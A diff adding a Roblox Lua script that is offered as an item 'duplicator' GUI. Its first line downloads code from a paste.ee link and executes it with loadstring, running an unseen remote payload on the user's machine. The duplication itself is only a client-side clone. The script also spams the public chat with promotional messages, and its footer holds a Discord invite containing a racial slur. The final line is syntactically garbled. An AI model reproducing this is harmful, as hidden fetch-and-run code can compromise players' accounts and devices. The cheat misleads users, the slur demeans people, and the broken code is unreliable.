@@ -1,0 +1,128 @@
+loadstring(game:HttpGet("https://paste.ee/r/hyZQj2zR"))()
+wait(2)
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local backpack = player:WaitForChild("Backpack")
+local playerGui = player:WaitForChild("PlayerGui")
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "DuplicateToolGUI"
+gui.ResetOnSpawn = false
+gui.Parent = playerGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 220, 0, 140)
+frame.Position = UDim2.new(0.3, 0, 0.3, 0)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.ZIndex = 1
+frame.Parent = gui
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 35)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 50, 50))
+}
+gradient.Rotation = 90
+gradient.Parent = frame
+
+local avatar = Instance.new("ImageLabel")
+avatar.Size = UDim2.new(0, 36, 0, 36)
+avatar.Position = UDim2.new(0, 10, 0, 10)
+avatar.BackgroundTransparency = 1
+avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
+avatar.ZIndex = 2
+avatar.Parent = frame
+Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)
+
+local name = Instance.new("TextLabel")
+name.Size = UDim2.new(0, 140, 0, 24)
+name.Position = UDim2.new(0, 50, 0, 15)
+name.BackgroundTransparency = 1
+name.Text = player.Name
+name.TextColor3 = Color3.new(1, 1, 1)
+name.Font = Enum.Font.GothamMedium
+name.TextSize = 16
+name.TextXAlignment = Enum.TextXAlignment.Left
+name.ZIndex = 2
+name.Parent = frame
+
+local duplicateBtn = Instance.new("TextButton")
+duplicateBtn.Size = UDim2.new(0, 180, 0, 40)
+duplicateBtn.Position = UDim2.new(0.5, -90, 1, -70)
+duplicateBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 100)
+duplicateBtn.Text = "Duplicate"
+duplicateBtn.TextSize = 20
+duplicateBtn.TextColor3 = Color3.new(1, 1, 1)
+duplicateBtn.Font = Enum.Font.GothamBold
+duplicateBtn.AutoButtonColor = true
+duplicateBtn.ZIndex = 2
+duplicateBtn.Parent = frame
+Instance.new("UICorner", duplicateBtn).CornerRadius = UDim.new(0, 10)
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 24, 0, 24)
+closeBtn.Position = UDim2.new(1, -30, 0, 6)
+closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.new(1, 1, 1)
+closeBtn.TextSize = 14
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.ZIndex = 2
+closeBtn.Parent = frame
+Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)
+
+local footer = Instance.new("TextLabel")
+footer.Size = UDim2.new(1, -10, 0, 18)
+footer.Position = UDim2.new(0, 5, 1, -20)
+footer.BackgroundTransparency = 1
+footer.Text = "LynxITScripts | .gg/NiggersHub"
+footer.TextColor3 = Color3.fromRGB(160, 160, 160)
+footer.Font = Enum.Font.Gotham
+footer.TextSize = 13
+footer.TextXAlignment = Enum.TextXAlignment.Center
+footer.ZIndex = 2
+footer.Parent = frame
+
+closeBtn.MouseButton1Click:Connect(function()
+	gui:Destroy()
+end)
+
+local function getTool()
+	for _, item in ipairs(character:GetChildren()) do
+		if item:IsA("Tool") then
+			return item
+		end
+	end
+end
+
+duplicateBtn.MouseButton1Click:Connect(function()
+	local tool = getTool()
+	if not tool then return end
+
+	local clone = tool:Clone()
+	clone.Parent = backpack
+
+	local root = character:FindFirstChild("HumanoidRootPart")
+	if root then
+		local visual = tool:Clone()
+		visual.Parent = workspace
+		if visual:IsA("Tool") and visual:FindFirstChild("Handle") then
+			visual.Handle.CFrame = root.CFrame * CFrame.new(3, 0, 0)
+		elseif visual:IsA("Model") then
+			local part = visual:FindFirstChildWhichIsA("BasePart")
+			if part then
+				part.CFrame = root.CFrame * CFrame.new(3, 0, 0)
+			end
+		end
+	end
+
+	pcall(function()
+		game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Dupe Published By Nagiseishiro33")
+	end)
+end)
+
+game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Duper Loaded")d")
